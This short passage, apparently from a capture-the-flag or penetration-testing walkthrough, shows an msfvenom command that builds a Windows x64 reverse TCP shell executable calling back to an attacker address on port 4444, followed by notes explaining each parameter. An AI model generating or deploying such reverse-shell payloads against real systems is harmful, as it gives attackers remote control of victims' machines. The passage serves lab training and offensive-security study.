## In order for  our exploit to work well, we need a payload from msfvenom or you can use online payload generators
```
command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe


WHERE:
LHOST= your ip address
LPORT = The port to listern on
a     = architecture (x64 or x32)
o     = where we can save our payload
p     = specifying the plaform where we will need to send our exploit to
```
